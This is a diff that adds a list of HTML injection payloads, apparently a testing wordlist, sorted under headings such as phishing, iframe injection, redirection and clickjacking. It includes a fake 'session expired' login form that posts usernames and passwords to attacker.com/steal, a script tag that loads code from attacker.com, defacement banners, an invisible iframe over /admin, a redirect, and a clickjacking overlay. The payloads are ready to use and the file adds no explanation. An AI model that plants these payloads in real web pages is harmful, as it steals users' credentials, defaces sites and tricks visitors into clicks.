@@ -1,0 +1,33 @@
+# Basic HTML injection
+<h1>HACKED BY VULNERAX</h1>
+<h1 style="color:red">SECURITY VULNERABILITY DETECTED</h1>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;color:red;font-size:24px;text-align:center;padding-top:20%">SYSTEM COMPROMISED</div>
+
+# Phishing attempts
+<form action="https://attacker.com/steal" method="POST">
+  <h3>Session expired. Please login again:</h3>
+  <input type="text" name="username" placeholder="Username">
+  <input type="password" name="password" placeholder="Password">
+  <button type="submit">Login</button>
+</form>
+
+# Iframe injections
+<iframe src="https://attacker.com" style="width:100%;height:100%;position:fixed;top:0;left:0;border:none"></iframe>
+<iframe src="/admin" style="opacity:0.01;position:fixed;top:0;left:0;width:100%;height:100%;border:none"></iframe>
+
+# Redirection
+<meta http-equiv="refresh" content="0; url=https://attacker.com">
+
+# Content manipulation
+<style>body { filter: invert(100%); }</style>
+<style>.login-button, .submit-button { display: none; }</style>
+<style>* { cursor: url("https://attacker.com/track"), auto; }</style>
+
+# JavaScript execution via HTML
+<script src="https://attacker.com/malicious.js"></script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+# Clickjacking
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999">
+  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:red;font-size:24px">Click here to win a prize!</div>
+</div>
